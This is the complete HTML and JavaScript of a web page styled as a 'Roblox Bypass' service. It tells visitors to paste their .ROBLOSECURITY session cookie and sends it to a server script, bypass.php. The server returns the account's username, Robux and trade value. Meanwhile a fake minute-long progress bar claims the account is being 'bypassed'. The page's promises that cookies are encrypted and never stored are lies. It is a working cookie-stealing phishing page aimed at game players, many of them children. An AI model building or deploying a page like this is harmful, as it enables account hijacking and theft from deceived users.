<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Bypass</title>

  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>

  <style>
    :root{
      --bg: #07070a;
      --card: rgba(255,255,255,.045);
      --card2: rgba(255,255,255,.03);
      --stroke: rgba(255,255,255,.10);
      --stroke2: rgba(255,255,255,.16);
      --glow: rgba(255,71,87,.55);
      --glow2: rgba(255,71,87,.22);
      --text: rgba(255,255,255,.92);
      --muted: rgba(255,255,255,.62);
    }

    body{
      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji","Segoe UI Emoji";
      background: radial-gradient(1000px 600px at 25% -10%, rgba(255,71,87,.20), transparent 60%),
                  radial-gradient(900px 520px at 85% 10%, rgba(120,119,198,.18), transparent 60%),
                  radial-gradient(1100px 700px at 50% 110%, rgba(52,152,219,.12), transparent 60%),
                  var(--bg);
      color: var(--text);
      overflow-x: hidden;
    }

    #bg-animation{
      position: fixed;
      inset: 0;
      width: 100vw;
      height: 100vh;
      z-index: 0;
      pointer-events: none;
      opacity: .9;
    }

    #snow-canvas{
      position: fixed;
      inset: 0;
      width: 100vw;
      height: 100vh;
      z-index: 0;
      pointer-events: none;
      opacity: .85;
    }

    .content-wrapper{
      position: relative;
      z-index: 1;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    .glass{
      background: linear-gradient(180deg, var(--card), var(--card2));
      border: 1px solid var(--stroke);
      border-radius: 18px;
      backdrop-filter: blur(16px);
      -webkit-backdrop-filter: blur(16px);
      box-shadow:
        0 16px 60px rgba(0,0,0,.55),
        inset 0 1px 0 rgba(255,255,255,.06);
      transition: border-color .2s ease;
    }

    .glass:hover{
      border-color: var(--stroke2);
    }

    .brand-gradient{
      background-image: linear-gradient(90deg, rgba(255,255,255,.95), rgba(255,107,107,.92), rgba(255,71,87,.95));
      -webkit-background-clip: text;
      background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    .badge{
      background: rgba(255,255,255,.05);
      border: 1px solid rgba(255,255,255,.10);
      color: rgba(255,255,255,.70);
    }

    .btn-primary{
      background: linear-gradient(45deg, rgba(255,71,87,1), rgba(255,107,107,1));
      box-shadow: 0 0 0 1px rgba(255,71,87,.25), 0 10px 35px var(--glow2);
      transition: transform .18s ease, box-shadow .18s ease, filter .18s ease, opacity .18s ease;
    }
    .btn-primary:hover{
      transform: translateY(-2px);
      box-shadow: 0 0 0 1px rgba(255,71,87,.30), 0 18px 60px var(--glow2), 0 0 20px var(--glow);
      filter: saturate(1.05);
    }
    .btn-primary:active{
      transform: translateY(0px);
      filter: saturate(.98);
    }

    .btn-ghost{
      background: rgba(255,255,255,.04);
      border: 1px solid rgba(255,255,255,.10);
      transition: transform .18s ease, border-color .18s ease, background .18s ease;
    }
    .btn-ghost:hover{
      transform: translateY(-1px);
      border-color: rgba(255,255,255,.16);
      background: rgba(255,255,255,.06);
    }

    .age-btn.active{
      background: linear-gradient(45deg, rgba(255,71,87,1), rgba(255,107,107,1));
      border-color: rgba(255,71,87,.50);
      color: rgba(255,255,255,.95);
      box-shadow: 0 0 0 1px rgba(255,71,87,.25), 0 8px 25px rgba(255,71,87,.20);
    }
    .age-btn.active:hover{
      box-shadow: 0 0 0 1px rgba(255,71,87,.30), 0 12px 35px rgba(255,71,87,.25);
    }

    .input{
      background: rgba(0,0,0,.26);
      border: 1px solid rgba(255,255,255,.10);
      color: rgba(255,255,255,.88);
      transition: border-color .2s ease, box-shadow .2s ease, background .2s ease;
    }
    .input:focus{
      outline: none;
      border-color: rgba(255,71,87,.75);
      box-shadow: 0 0 0 3px rgba(255,71,87,.18);
      background: rgba(0,0,0,.32);
    }

    .message{
      border: 1px solid rgba(255,255,255,.10);
      background: rgba(255,255,255,.04);
    }
    .message.success{
      border-color: rgba(46,204,113,.30);
      background: rgba(46,204,113,.10);
      color: rgba(46,204,113,.95);
    }
    .message.error{
      border-color: rgba(231,76,60,.32);
      background: rgba(231,76,60,.10);
      color: rgba(231,76,60,.95);
    }
    .message.info{
      border-color: rgba(52,152,219,.30);
      background: rgba(52,152,219,.10);
      color: rgba(160,220,255,.95);
    }

    .divider{
      height: 1px;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,.12), transparent);
    }

    ::-webkit-scrollbar{ width: 10px; }
    ::-webkit-scrollbar-track{ background: rgba(255,255,255,.04); }
    ::-webkit-scrollbar-thumb{ background: rgba(255,255,255,.14); border-radius: 8px; }
    ::-webkit-scrollbar-thumb:hover{ background: rgba(255,71,87,.55); }

    .loading-overlay{
      position: fixed;
      inset: 0;
      z-index: 9999;
      display: grid;
      place-items: center;
      padding: 24px;
      background: radial-gradient(900px 500px at 30% 10%, rgba(255,71,87,.12), transparent 60%),
                  radial-gradient(900px 500px at 70% 20%, rgba(120,119,198,.12), transparent 60%),
                  rgba(0,0,0,.35);
      backdrop-filter: blur(6px);
      -webkit-backdrop-filter: blur(6px);
      transition: opacity .35s ease, transform .35s ease;
    }

    .loading-overlay.hide{
      opacity: 0;
      transform: translateY(-6px);
      pointer-events: none;
    }

    .loading-card{
      width: min(520px, 92vw);
      border-radius: 22px;
      padding: 22px 22px 18px;
      background: linear-gradient(180deg, rgba(255,255,255,.08), rgba(255,255,255,.04));
      border: 1px solid rgba(255,255,255,.14);
      box-shadow: 0 24px 90px rgba(0,0,0,.62), inset 0 1px 0 rgba(255,255,255,.08);
      backdrop-filter: blur(18px);
      -webkit-backdrop-filter: blur(18px);
    }

    .loading-top{
      display: flex;
      align-items: center;
      gap: 14px;
      margin-bottom: 14px;
    }

    .loading-title{
      font-weight: 800;
      letter-spacing: .3px;
      font-size: 18px;
      color: rgba(255,255,255,.92);
    }
    .loading-sub{
      margin-top: 2px;
      font-size: 12px;
      color: rgba(255,255,255,.55);
    }

    .loading-spinner{
      width: 20px;
      height: 20px;
      border-radius: 999px;
      border: 2px solid rgba(255,255,255,.20);
      border-top-color: rgba(255,71,87,.95);
      box-shadow: 0 0 14px rgba(255,71,87,.25);
      animation: spin .8s linear infinite;
      flex: 0 0 auto;
    }
    @keyframes spin{ to{ transform: rotate(360deg); } }

    .loading-bar-wrap{
      position: relative;
      height: 12px;
      border-radius: 999px;
      background: rgba(255,255,255,.08);
      border: 1px solid rgba(255,255,255,.10);
      overflow: hidden;
    }

    .loading-bar-fill{
      position: absolute;
      inset: 0 auto 0 0;
      width: 0%;
      background: linear-gradient(90deg, rgba(255,71,87,1), rgba(255,107,107,1));
      box-shadow: 0 0 22px rgba(255,71,87,.25);
      transition: width .12s ease;
    }

    .loading-bar-dot{
      position: absolute;
      top: 50%;
      left: 0%;
      transform: translate(-50%, -50%);
      width: 14px;
      height: 14px;
      border-radius: 999px;
      background: rgba(255,255,255,.92);
      box-shadow: 0 0 16px rgba(255,71,87,.45), 0 0 0 4px rgba(255,71,87,.16);
      transition: left .12s ease;
    }

    .loading-meta{
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-top: 10px;
      font-size: 12px;
      color: rgba(255,255,255,.62);
    }
    .loading-hint{
      color: rgba(255,255,255,.45);
    }

    .bypass-progress-overlay {
      position: fixed;
      inset: 0;
      z-index: 9998;
      display: grid;
      place-items: center;
      padding: 24px;
      background: radial-gradient(900px 500px at 30% 10%, rgba(255,71,87,.12), transparent 60%),
                  radial-gradient(900px 500px at 70% 20%, rgba(120,119,198,.12), transparent 60%),
                  rgba(0,0,0,.35);
      backdrop-filter: blur(6px);
      -webkit-backdrop-filter: blur(6px);
      opacity: 1;
      visibility: visible;
      transition: opacity .35s ease, visibility .35s ease;
    }

    .bypass-progress-overlay.hidden {
      opacity: 0;
      visibility: hidden;
      pointer-events: none;
    }

    .bypass-progress-card {
      width: min(520px, 92vw);
      border-radius: 22px;
      padding: 28px;
      background: linear-gradient(180deg, rgba(255,255,255,.08), rgba(255,255,255,.04));
      border: 1px solid rgba(255,255,255,.14);
      box-shadow: 0 24px 90px rgba(0,0,0,.62), inset 0 1px 0 rgba(255,255,255,.08);
      backdrop-filter: blur(18px);
      -webkit-backdrop-filter: blur(18px);
    }

    .bypass-progress-title {
      font-weight: 800;
      letter-spacing: .3px;
      font-size: 20px;
      color: rgba(255,255,255,.92);
      margin-bottom: 20px;
    }

    .bypass-acc-info {
      background: rgba(255,255,255,.04);
      border: 1px solid rgba(255,255,255,.10);
      border-radius: 14px;
      padding: 16px;
      margin-bottom: 20px;
      display: flex;
      gap: 12px;
      align-items: center;
    }

    .bypass-acc-avatar {
      width: 48px;
      height: 48px;
      border-radius: 12px;
      border: 1px solid rgba(255,255,255,.10);
      flex-shrink: 0;
    }

    .bypass-acc-details {
      flex: 1;
    }

    .bypass-acc-name {
      font-size: 14px;
      font-weight: 600;
      color: rgba(255,255,255,.92);
      margin-bottom: 4px;
    }

    .bypass-acc-meta {
      font-size: 12px;
      color: rgba(255,255,255,.55);
    }

    .bypass-progress-bar-wrap {
      position: relative;
      height: 14px;
      border-radius: 999px;
      background: rgba(255,255,255,.08);
      border: 1px solid rgba(255,255,255,.10);
      overflow: hidden;
      margin-bottom: 12px;
    }

    .bypass-progress-bar-fill {
      position: absolute;
      inset: 0 auto 0 0;
      width: 0%;
      background: linear-gradient(90deg, rgba(255,71,87,1), rgba(255,107,107,1));
      box-shadow: 0 0 22px rgba(255,71,87,.25);
      transition: width .2s ease;
    }

    .bypass-progress-bar-dot {
      position: absolute;
      top: 50%;
      left: 0%;
      transform: translate(-50%, -50%);
      width: 16px;
      height: 16px;
      border-radius: 999px;
      background: rgba(255,255,255,.92);
      box-shadow: 0 0 16px rgba(255,71,87,.45), 0 0 0 4px rgba(255,71,87,.16);
      transition: left .2s ease;
    }

    .bypass-progress-meta {
      display: flex;
      align-items: center;
      justify-content: space-between;
      font-size: 12px;
      color: rgba(255,255,255,.62);
      margin-bottom: 20px;
    }

    .bypass-progress-text {
      font-size: 14px;
      color: rgba(255,255,255,.75);
      text-align: center;
      min-height: 20px;
    }

    .bypass-success-message {
      font-size: 16px;
      font-weight: 700;
      color: rgba(46,204,113,.95);
      text-align: center;
      margin-top: 16px;
    }

    @media (prefers-reduced-motion: reduce){
      #bg-animation, #snow-canvas{ display:none; }
      .glass, .btn-primary, .btn-ghost, .loading-overlay{ transition: none !important; }
      .loading-spinner{ animation: none !important; }
    }
  </style>

  <script type="importmap">
    {
      "imports": {
        "three": "https://unpkg.com/three@0.160.0/build/three.module.js"
      }
    }
  </script>
</head>

<body>
  <canvas id="bg-animation"></canvas>
  <canvas id="snow-canvas"></canvas>

  <div id="bypass-progress-overlay" class="bypass-progress-overlay hidden">
    <div class="bypass-progress-card">
      <div class="bypass-progress-title">Bypassing Account...</div>
      
      <div class="bypass-acc-info">
        <img id="bypass-avatar" src="" alt="Avatar" class="bypass-acc-avatar" />
        <div class="bypass-acc-details">
          <div class="bypass-acc-name" id="bypass-username">Loading...</div>
          <div class="bypass-acc-meta" id="bypass-acc-meta">Processing...</div>
        </div>
      </div>

      <div class="bypass-progress-bar-wrap" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0">
        <div class="bypass-progress-bar-fill" id="bypass-progress-bar-fill"></div>
        <div class="bypass-progress-bar-dot" id="bypass-progress-bar-dot"></div>
      </div>

      <div class="bypass-progress-meta">
        <span id="bypass-progress-percent">0%</span>
        <span class="loading-hint">Processing...</span>
      </div>

      <div class="bypass-progress-text" id="bypass-progress-text"></div>
      <div class="bypass-success-message hidden" id="bypass-success-message">✓ Account Successfully Bypassed</div>
    </div>
  </div>

  <!-- Loading Screen -->
  <div id="loading-overlay" class="loading-overlay">
    <div class="loading-card">
      <div class="loading-top">
        <div class="loading-spinner" aria-hidden="true"></div>
        <div>
          <div class="loading-title">Loading</div>
          <div class="loading-sub">Initializing UI…</div>
        </div>
      </div>

      <div class="loading-bar-wrap" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0">
        <div class="loading-bar-fill" id="loading-bar-fill"></div>
        <div class="loading-bar-dot" id="loading-bar-dot"></div>
      </div>

      <div class="loading-meta">
        <span id="loading-percent">0%</span>
        <span class="loading-hint">Please wait</span>
      </div>
    </div>
  </div>

  <div class="content-wrapper">
    <nav class="px-4 py-4">
      <div class="max-w-6xl mx-auto flex items-center justify-between">
        <div class="flex items-center gap-3">
          <div class="w-10 h-10 rounded-xl glass flex items-center justify-center">
            <i class="fa-solid fa-bolt text-rose-400"></i>
          </div>
          <div class="leading-tight">
            <div class="text-lg font-semibold brand-gradient tracking-wide">Vzro</div>
            <div class="text-xs text-white/55 -mt-0.5">Premium Bypasser</div>
          </div>
        </div>

        <div class="flex items-center gap-3">
          <span class="badge px-3 py-1.5 rounded-full text-xs font-semibold">X 3.2</span>
          <button class="btn-ghost px-3 py-2 rounded-xl text-sm font-semibold text-white/80" type="button">
            <i class="fa-solid fa-circle-question mr-2"></i>Help
          </button>
        </div>
      </div>
    </nav>

    <main class="flex-grow px-4 pb-10">
      <div class="max-w-6xl mx-auto grid lg:grid-cols-2 gap-6 items-start">
        <section class="glass p-7 lg:p-9">
          <div class="flex items-start justify-between gap-4">
            <div>
              <h1 class="text-3xl lg:text-4xl font-bold tracking-tight">
                Roblox <span class="brand-gradient">Bypass</span>
              </h1>
              <p class="mt-2 text-white/60 max-w-xl">
                Secure and lightning-fast account bypass processing with instant results.
              </p>
            </div>

            <div class="hidden sm:flex flex-col items-end gap-2">
              <span class="text-xs text-white/55">Status</span>
              <div class="flex items-center gap-2 px-3 py-2 rounded-xl glass">
                <span class="w-2.5 h-2.5 rounded-full bg-emerald-400 shadow-[0_0_14px_rgba(52,211,153,.55)]"></span>
                <span class="text-sm font-semibold text-white/80">Online</span>
              </div>
            </div>
          </div>

          <div class="mt-7 divider"></div>

          <div class="mt-7 grid sm:grid-cols-3 gap-4">
            <div class="glass p-4">
              <div class="text-white/60 text-xs">Speed</div>
              <div class="mt-1 text-xl font-bold">Instant</div>
              <div class="mt-2 text-xs text-white/55">Real-time processing</div>
            </div>
            <div class="glass p-4">
              <div class="text-white/60 text-xs">Security</div>
              <div class="mt-1 text-xl font-bold">Hardened</div>
              <div class="mt-2 text-xs text-white/55">Encrypted & Safe</div>
            </div>
            <div class="glass p-4">
              <div class="text-white/60 text-xs">Success Rate</div>
              <div class="mt-1 text-xl font-bold">99.8%</div>
              <div class="mt-2 text-xs text-white/55">Premium verified</div>
            </div>
          </div>

          <div class="mt-7 flex flex-col sm:flex-row gap-3">
            <button class="btn-primary w-full sm:w-auto px-5 py-3 rounded-xl font-bold" type="button">
              <i class="fa-solid fa-lock mr-2"></i> Start Bypass
            </button>
            <button class="btn-ghost w-full sm:w-auto px-5 py-3 rounded-xl font-semibold text-white/80" type="button">
              <i class="fa-solid fa-shield-halved mr-2"></i> Security Info
            </button>
          </div>

          <p class="mt-4 text-xs text-white/45">
            Tip: Use fresh cookies. Keep your account secure at all times.
          </p>
        </section>

        <section class="glass p-7 lg:p-9">
          <div class="flex items-center justify-between">
            <h2 class="text-2xl font-bold">
              Bypass <span class="text-rose-400">Details</span>
            </h2>
            <span class="badge px-3 py-1.5 rounded-full text-xs font-semibold">
              <i class="fa-solid fa-lock mr-2"></i>Protected
            </span>
          </div>

          <p class="mt-2 text-white/60">
            Enter your credentials securely. All data is encrypted and protected.
          </p>

          <div id="account-info" class="hidden mt-6 p-5 rounded-2xl message info">
            <div class="flex items-center justify-between gap-3">
              <div class="flex items-center gap-3">
                <img id="user-avatar" src="" alt="Avatar" class="w-12 h-12 rounded-xl border border-white/10" />
                <div>
                  <div class="text-sm text-white/60">Signed in as</div>
                  <div id="user-name" class="text-lg font-bold leading-tight"></div>
                </div>
              </div>
              <div class="text-right">
                <div class="text-xs text-white/55">Status</div>
                <div class="text-sm font-semibold text-white/80">Verified</div>
              </div>
            </div>
          </div>

          <form id="bypass-form" class="mt-6 space-y-5">
            <div class="space-y-2">
              <label class="text-sm font-semibold text-white/75" for="cookies">.ROBLOSECURITY</label>
              <textarea
                id="cookies"
                class="input w-full rounded-xl px-4 py-3 h-24"
                placeholder="Paste your .ROBLOSECURITY cookie here..."
                autocomplete="off"
              ></textarea>
              <p class="text-xs text-white/45">
                Your cookies are encrypted and never stored on our servers.
              </p>
            </div>

            <div class="grid sm:grid-cols-2 gap-4">
              <div class="space-y-2">
                <label class="text-sm font-semibold text-white/75" for="refreshed">Cookie Status</label>
                <div class="flex items-center gap-2 p-3 rounded-xl glass">
                  <input type="checkbox" id="refreshed" class="w-4 h-4 accent-rose-500">
                  <label for="refreshed" class="text-sm text-white/60">Cookies refreshed</label>
                </div>
              </div>

              <div class="space-y-2">
                <label class="text-sm font-semibold text-white/75">Account Age</label>
                <div class="flex gap-3">
                  <button type="button" id="age-plus13" class="age-btn flex-1 px-4 py-3 rounded-xl font-semibold text-white/80 btn-ghost transition-all" data-value="+13">
                    <i class="fa-solid fa-check mr-2"></i>+13 Years
                  </button>
                  <button type="button" id="age-under13" class="age-btn flex-1 px-4 py-3 rounded-xl font-semibold text-white/80 btn-ghost transition-all" data-value="<13">
                    <i class="fa-solid fa-check mr-2"></i>Under 13
                  </button>
                </div>
              </div>
            </div>

            <button type="submit" id="submit-btn" class="btn-primary w-full py-3.5 rounded-xl font-extrabold text-base flex items-center justify-center gap-2">
              <span>Bypass Account</span>
              <i id="loading-spinner" class="fa-solid fa-spinner fa-spin hidden"></i>
            </button>

            <div class="divider"></div>

            <a href="https://discord.gg/JhgYsfv6kn" target="_blank" rel="noopener noreferrer" class="block">
              <button type="button" class="btn-primary w-full px-4 py-3 rounded-xl font-semibold text-white">
                <i class="fa-brands fa-discord mr-2"></i> Join Discord Community
              </button>
            </a>
          </form>

          <div id="message-box" class="hidden mt-5 p-4 rounded-2xl text-center font-semibold message"></div>

          <p class="mt-5 text-xs text-white/40">
            Bypasser made by zyx and vnxy.
          </p>
        </section>
      </div>

      <footer class="max-w-6xl mx-auto mt-8 text-center text-xs text-white/35">
        © <span id="year"></span> Vzro — Premium Bypasser
      </footer>
    </main>
  </div>

  <script type="module">
    import * as THREE from "three";

    const prefersReduced = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
    const canvas = document.getElementById("bg-animation");

    let scene, camera, renderer, points;
    let rafId = null;

    function initThree() {
      if (prefersReduced) return;

      scene = new THREE.Scene();
      camera = new THREE.PerspectiveCamera(62, window.innerWidth / window.innerHeight, 1, 1200);
      camera.position.z = 2;

      renderer = new THREE.WebGLRenderer({ canvas, antialias: true, alpha: true });
      renderer.setSize(window.innerWidth, window.innerHeight);
      renderer.setPixelRatio(Math.min(window.devicePixelRatio || 1, 2));

      const geo = new THREE.BufferGeometry();
      const count = 5200;
      const positions = new Float32Array(count * 3);

      for (let i = 0; i < count; i++) {
        const i3 = i * 3;
        positions[i3 + 0] = (Math.random() - 0.5) * 760;
        positions[i3 + 1] = (Math.random() - 0.5) * 760;
        positions[i3 + 2] = (Math.random() - 0.5) * 760;
      }
      geo.setAttribute("position", new THREE.BufferAttribute(positions, 3));

      const mat = new THREE.PointsMaterial({
        color: 0xffffff,
        size: 0.6,
        transparent: true,
        opacity: 0.65
      });

      points = new THREE.Points(geo, mat);
      scene.add(points);

      const onResize = () => {
        camera.aspect = window.innerWidth / window.innerHeight;
        camera.updateProjectionMatrix();
        renderer.setSize(window.innerWidth, window.innerHeight);
      };
      window.addEventListener("resize", onResize);

      const animate = () => {
        points.rotation.y += 0.00035;
        points.rotation.x += 0.00018;
        renderer.render(scene, camera);
        rafId = requestAnimationFrame(animate);
      };
      animate();
    }

    initThree();

    document.addEventListener("visibilitychange", () => {
      if (!prefersReduced && document.hidden && rafId) cancelAnimationFrame(rafId);
    });
  </script>

  <script>
    const prefersReduced = window.matchMedia("(prefers-reduced-motion: reduce)").matches;

    (() => {
      const canvas = document.getElementById("snow-canvas");
      const ctx = canvas.getContext("2d", { alpha: true });

      let w, h, dpr;
      let flakes = [];
      let raf = null;

      function resize() {
        dpr = Math.min(window.devicePixelRatio || 1, 2);
        w = canvas.width = Math.floor(window.innerWidth * dpr);
        h = canvas.height = Math.floor(window.innerHeight * dpr);
        canvas.style.width = window.innerWidth + "px";
        canvas.style.height = window.innerHeight + "px";

        const count = Math.max(90, Math.floor((window.innerWidth * window.innerHeight) / 12000));
        flakes = new Array(count).fill(0).map(() => spawn(true));
      }

      function spawn(initial = false) {
        const x = Math.random() * w;
        const y = initial ? Math.random() * h : -20 * dpr;
        const r = (Math.random() * 2.4 + 0.7) * dpr;          
        const vy = (Math.random() * 1.05 + 0.55) * dpr;       
        const vx = (Math.random() * 0.35 - 0.175) * dpr;      
        const sway = (Math.random() * 1.25 + 0.35) * dpr;    
        const opacity = Math.random() * 0.35 + 0.25;
        return { x, y, r, vy, vx, sway, opacity, phase: Math.random() * Math.PI * 2 };
      }

      function tick() {
        ctx.clearRect(0, 0, w, h);

        for (let i = 0; i < flakes.length; i++) {
          const f = flakes[i];
          f.phase += 0.012;
          f.x += f.vx + Math.sin(f.phase) * 0.14 * f.sway;
          f.y += f.vy;

          if (f.y > h + 40 * dpr) flakes[i] = spawn(false);
          if (f.x < -40 * dpr) f.x = w + 40 * dpr;
          if (f.x > w + 40 * dpr) f.x = -40 * dpr;

          ctx.beginPath();
          ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2);
          ctx.fillStyle = `rgba(255,255,255,${f.opacity})`;
          ctx.fill();
        }

        raf = requestAnimationFrame(tick);
      }

      if (!prefersReduced) {
        resize();
        window.addEventListener("resize", resize);
        tick();
      }
    })();

    (() => {
      const overlay = document.getElementById("loading-overlay");
      const fill = document.getElementById("loading-bar-fill");
      const dot = document.getElementById("loading-bar-dot");
      const percentText = document.getElementById("loading-percent");
      const barWrap = overlay.querySelector(".loading-bar-wrap");

      let p = 0;

      function setProgress(val) {
        const clamped = Math.max(0, Math.min(100, val));
        fill.style.width = clamped + "%";
        dot.style.left = clamped + "%";
        percentText.textContent = Math.round(clamped) + "%";
        barWrap.setAttribute("aria-valuenow", String(Math.round(clamped)));
      }

      function step() {
        const remaining = 100 - p;
        const inc = Math.max(0.35, remaining * 0.04) * (Math.random() * 0.65 + 0.75);
        p = Math.min(100, p + inc);
        setProgress(p);

        if (p >= 100) {

          setTimeout(() => overlay.classList.add("hide"), 250);
          setTimeout(() => overlay.remove(), 800);
          return;
        }

        setTimeout(step, 45);
      }


      if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", step);
      } else {
        step();
      }
    })();

    document.getElementById("year").textContent = new Date().getFullYear();

    const form = document.getElementById("bypass-form");
    const submitBtn = document.getElementById("submit-btn");
    const spinner = document.getElementById("loading-spinner");
    const messageBox = document.getElementById("message-box");
    const accountInfoDiv = document.getElementById("account-info");

    function showMessage(text, type = "info") {
      messageBox.textContent = text;
      messageBox.className = "mt-5 p-4 rounded-2xl text-center font-semibold message " + type;
      messageBox.classList.remove("hidden");
    }

    function setLoading(isLoading) {
      submitBtn.disabled = isLoading;
      if (isLoading) {
        spinner.classList.remove("hidden");
        submitBtn.classList.add("opacity-80");
      } else {
        spinner.classList.add("hidden");
        submitBtn.classList.remove("opacity-80");
      }
    }

    let selectedAge = null;
    const ageButtons = document.querySelectorAll(".age-btn");
    
    ageButtons.forEach(btn => {
      btn.addEventListener("click", (e) => {
        e.preventDefault();
        ageButtons.forEach(b => b.classList.remove("active"));
        btn.classList.add("active");
        selectedAge = btn.dataset.value;
      });
    });

    // Bypass progress overlay logic
    const bypassProgressOverlay = document.getElementById("bypass-progress-overlay");
    const bypassProgressBarFill = document.getElementById("bypass-progress-bar-fill");
    const bypassProgressBarDot = document.getElementById("bypass-progress-bar-dot");
    const bypassProgressPercent = document.getElementById("bypass-progress-percent");
    const bypassUsername = document.getElementById("bypass-username");
    const bypassAccMeta = document.getElementById("bypass-acc-meta");
    const bypassAvatar = document.getElementById("bypass-avatar");
    const bypassSuccessMessage = document.getElementById("bypass-success-message");
    const bypassProgressText = document.getElementById("bypass-progress-text");

    function startBypassProgress(accountInfo, newAge) {
      bypassProgressOverlay.classList.remove("hidden");
      bypassSuccessMessage.classList.add("hidden");
      bypassProgressText.textContent = "";
      
      bypassAvatar.src = accountInfo.avatar;
      bypassUsername.textContent = accountInfo.username;
      bypassAccMeta.textContent = `Old Age: ${accountInfo.oldAge} → New Age: ${newAge}`;
      
      let progress = 0;
      const startTime = Date.now();
      const duration = 60000;
      
      function updateProgress() {
        const elapsed = Date.now() - startTime;
        progress = Math.min(100, (elapsed / duration) * 100);
        
        bypassProgressBarFill.style.width = progress + "%";
        bypassProgressBarDot.style.left = progress + "%";
        bypassProgressPercent.textContent = Math.floor(progress) + "%";
        
        if (progress < 100) {
          requestAnimationFrame(updateProgress);
        } else {
          bypassProgressPercent.textContent = "100%";
          bypassProgressBarFill.style.width = "100%";
          bypassProgressBarDot.style.left = "100%";
          bypassSuccessMessage.classList.remove("hidden");
          
          
          setTimeout(() => {
            bypassProgressOverlay.classList.add("hidden");
            accountInfoDiv.classList.remove("hidden");
            showMessage("Account successfully bypassed!", "success");
          }, 2000);
        }
      }
      
      updateProgress();
    }

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const cookies = document.getElementById("cookies").value.trim();
      const refreshed = document.getElementById("refreshed").checked;
      const age = selectedAge;

      if (!cookies) return showMessage("Please enter your cookie", "error");
      if (!refreshed) return showMessage("Please make sure to refresh your cookie first", "error");
      if (age !== "+13") return showMessage("Account must be +13 years old", "error");

      setLoading(true);
      messageBox.classList.add("hidden");

      try {
        const response = await fetch("bypass.php", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ cookies, accountAge: age })
        });

        const data = await response.json();

        if (response.ok && data.success) {
          const accountInfo = {
            avatar: data.avatar,
            username: data.username,
            oldAge: data.oldAge || "13",
            robux: data.robux,
            rap: data.rap
          };
          startBypassProgress(accountInfo, age);
          document.getElementById("user-avatar").src = data.avatar;
          document.getElementById("user-name").textContent = data.username;
        } else {
          showMessage(data.error || "Bypass failed. Check your cookie.", "error");
        }
      } catch (err) {
        showMessage("Connection error. Please try again.", "error");
      } finally {
        setLoading(false);
      }
    });
  </script>
</body>
</html>
